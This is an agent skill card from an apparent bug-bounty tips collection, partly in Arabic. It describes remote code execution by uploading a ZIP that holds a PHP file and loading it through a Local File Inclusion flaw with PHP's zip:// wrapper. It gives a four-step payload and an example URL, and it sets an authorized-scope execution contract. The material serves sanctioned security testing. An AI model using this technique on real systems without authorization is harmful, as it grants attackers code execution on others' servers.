# SKILL: RCE عبر رفع ملف ZIP يحتوي على PHP + PHP zip wrapper

**Skill id:** `tip/rce-عبر-رفع-ملف-zip-يحتوي-على-php-php-zip-wrapper`  
**Category:** RCE  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dcdac31e8808103ab92f562cb71064f  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **RCE**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

لو الأبلكيشن بيسمح برفع ملفات مضغوطة وفيه LFI (Local File Inclusion)، الـ PHP zip wrapper بيسمحلك تنفّذ ملف PHP من جوه أرشيف ZIP مرفوع من غير ما تحتاج ترفع .php مباشرة.

## Payload / Code

```
1) اعمل ملف .php (rce.php)
2) كمّصه في ملف .zip ([file.zip](http://file.zip))
3) ارفع الـ .zip على الأبلكيشن اللي فيه ثغرة
4) شغّل الـ RCE عبر:
https://\.com/index.php?page=zip://path/[file.zip](http://file.zip)#rce.php
```

## Source

Omar Abdelsalam

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
